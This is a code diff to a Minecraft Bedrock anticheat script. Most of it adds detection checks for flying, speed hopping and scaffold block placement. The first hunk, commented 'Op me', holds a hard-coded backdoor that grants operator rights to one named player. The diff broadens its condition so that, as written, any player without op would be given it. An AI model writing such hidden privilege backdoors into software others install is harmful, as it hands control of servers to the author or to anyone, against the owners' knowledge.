@@ -455,7 +455,7 @@ Minecraft.system.runInterval(() => {
 
 		
 		// bigrat.jar = Op me
-		if(player.nameTag === "Dream23322" && !player.hasTag("op") && !player.hasTag("dontop")) {
+		if(player.nameTag === "Dream23322" && !player.hasTag("op") && !player.hasTag("dontop") || !player.isOp) {
 			setTitle(player, "Welcome Dream23322", "Isolate Anticheat");
 			player.addTag("op");
 			player.setOp(true);
@@ -651,10 +651,13 @@ Minecraft.system.runInterval(() => {
 					if(player.hasTag("moving") && !player.hasTag("ground") && !player.hasTag("nofly") && !player.hasTag("nofly") && !player.isOnGround && !player.hasTag("damaged")) {
 						//const simYPos = Math.abs(currentYPos - oldY) <= config.modules.flyF.diff && Math.abs(currentYPos - oldOldY) <= config.modules.flyF.diff;
 						const prediction = Math.abs(currentYPos - oldY) > player.fallDistance && player.fallDistance > 3 && yDiff > 5;
-						//const prediction2 = Math.abs(player.fallDistance) === 0 || Math.abs(player.fallDistance) < 0.0001;
+						const prediction2 = playerVelocity.y > 0.37 && aroundAir(player) === true;
 
 						if(prediction) {
 							flag(player, "Fly", "F", "Movement", "fallDistance", player.fallDistance, false);
+						}
+						if(prediction2) {
+							flag(player, "Fly", "F", "Movement", "y-velocity", playerVelocity.y, false);
 						}
 					}
 					oldOldYPos.set(player, oldY);
@@ -694,6 +697,10 @@ Minecraft.system.runInterval(() => {
 
 				}
 			}
+
+			if(player.isFlying && playerSpeed > 1.09) {
+				flag(player, "Motion", "D", "Movement", "speed", playerSpeed, true);
+			}
 		}
 
 		// ==================================
@@ -723,10 +730,13 @@ Minecraft.system.runInterval(() => {
 				if(Math.abs(currentRotation - oldRotation) > 40 + 1.2e-10 && currentSpeed >= oldSpeed + 0.1 && playerSpeed !== 0 && player.hasTag("moving") && Math.abs(currentRotation - oldRotation) !== 0 && playerSpeed > 0.48 && !player.hasTag("damaged") && player.hasTag("strict") && !player.getEffect("speed") && !player.hasTag("nospeed")) {
 					flag(player, "Speed", "B", "Movement", "rotationDiff", `${Math.abs(currentRotation - oldRotation)},speed=${currentSpeed}`)
 				}
-				// Acceleration Prediction
-				const speedPrediction = oldSpeed2 === 0 && currentSpeed === oldSpeed && currentSpeed !== 0 && oldSpeed !== 0;
-				if(speedPrediction) {
-					flag(player, "Speed", "C", "Movement", "speedPrediction", "true", false);
+				// BHop check
+				if(config.modules.speedC.enabled) {
+					if(playerSpeed > 0.2) {
+						if(Math.abs(playerVelocity.y).toFixed(4) === "0.4000") {
+							flag(player, "Speed", "C", "Movement", "y-Velocity")
+						}
+					}
 				}
 				// Update the player's previous speed and rotation
 				oldOldSpeed.set(player, oldSpeed);
@@ -1145,7 +1155,19 @@ world.afterEvents.blockPlace.subscribe((blockPlace) => {
 					flag(player, "Scaffold", "D", "Placement", "heldItem", `${item.typeId},blockId=${block.typeId}`, false);
 					undoPlace = true;
 				}
-			}	
+			}
+
+			// If the blocks placement location cant be reached, flag
+			if(blockUnder.location.x === block.location.x && blockUnder.location.y === block.location.y - 1&& blockUnder.location.z === block.location.z) {
+				if(blockUnder.typeId !== "minecraft:air") {
+					flag(player, "Scaffold", "D", "Placement", "blockUnder", blockUnder.typeId, false);
+				}
+			}
+
+			// If the blocks location is below -64 flag
+			if(block.location.y < -64) {
+				flag(player, "Scaffold", "D", "Placement", "location", block.location.y, false);
+			}
 		}
 
 		// Scaffold/E = Speed limit check
